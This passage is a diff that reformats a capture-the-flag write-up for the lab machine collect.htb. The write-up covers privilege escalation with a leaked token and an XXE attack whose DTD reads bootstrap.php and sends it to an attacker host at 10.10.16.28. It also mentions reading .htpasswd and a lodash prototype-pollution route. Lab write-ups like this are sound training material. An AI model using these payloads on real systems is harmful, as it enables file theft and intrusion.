@@ -136,8 +136,9 @@ token=ddac62a28254561001277727cb397baf
 
 ## API XXE
 
-1. Register an account on [collect.htb](http://collect.htb/register) and capture the requests in burp  
-2. Use the previously discovered token to elevate our privileges  
+Register an account on [collect.htb](http://collect.htb/register) and capture the requests in burp  
+Use the previously discovered token to elevate our privileges  
+
 ```http
 POST /set/role/admin HTTP/1.1
 Host: collect.htb
@@ -155,7 +156,9 @@ Upgrade-Insecure-Requests: 1
 
 token=ddac62a28254561001277727cb397baf
 ```
-3. Open [Collect - Admin](http://collect.htb/admin) in your browser, register a new API User and capture the request  
+
+Open [Collect - Admin](http://collect.htb/admin) in your browser, register a new API User and capture the request  
+
 ```http
 POST /api HTTP/1.1
 Host: collect.htb
@@ -172,11 +175,13 @@ Cookie: PHPSESSID=b8gl9c885k7c52t61afnen4nj8
 
 manage_api=<?xml version="1.0" encoding="UTF-8"?><root><method>POST</method><uri>/auth/register</uri><user><username>mrk1</username><password>mrk1</password></user></root>
 ```
-4. After some try and error we are able to read files . Check bootstrap.php to receive the redis password!  
+
+After some try and error we are able to read files . Check bootstrap.php to receive the redis password!  
 
 **xxe.dtd**  
 Do it for **index.php** to get an overview and than check **bootstrap.php** which is mentioned in **index.php**  
 While poking around we also discovered **/var/www/developers/.htpasswd**  
+
 ```dtd
 <!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource=../bootstrap.php'>
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.10.16.28/?file=%file;'>">
@@ -185,6 +190,7 @@ While poking around we also discovered **/var/www/developers/.htpasswd**
 ```
 
 **Burp Request**  
+
 ```http
 POST /api HTTP/1.1
 Host: collect.htb
@@ -204,6 +210,7 @@ manage_api=<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe S
 ```
 
 **bootstrap.php**  
+
 ```php
 <?php
 ini_set('session.save_handler','redis');
@@ -357,7 +364,7 @@ root        1347  0.0  1.9 1664540 76956 ?       Sl   Dec12   0:01 /usr/bin/node
 While parsing through the source code we can spot a possible **[prototype pollution](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#exec-exploitation)** vulnerability  
 But checking the code will tell us that we need admin permissions on the api.
 
-```node
+```javascript
 const Message = require('../models/Message');
 const { decodejwt } = require('../functions/jwt');
 const _ = require('lodash');
@@ -457,7 +464,6 @@ curl -X GET http://localhost:3000/documentation -H 'Content-Type: application/js
 ```
 
 ```json
-# Short Version
 {
   "Documentation": {
     "Routes": {
